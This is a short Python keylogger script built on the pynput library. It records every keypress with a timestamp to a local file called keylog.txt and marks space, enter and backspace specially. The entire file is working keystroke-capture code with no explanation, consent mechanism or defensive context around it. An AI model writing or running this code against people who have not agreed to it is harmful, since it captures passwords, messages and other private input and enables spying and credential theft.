from pynput import keyboard 
#pip install pynput
import os
from datetime import datetime

log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()}: {key}\n")

def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        elif key == keyboard.Key.backspace:
            write_to_file("<BACKSPACE>")
        else:
            write_to_file(f"[{key}]")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
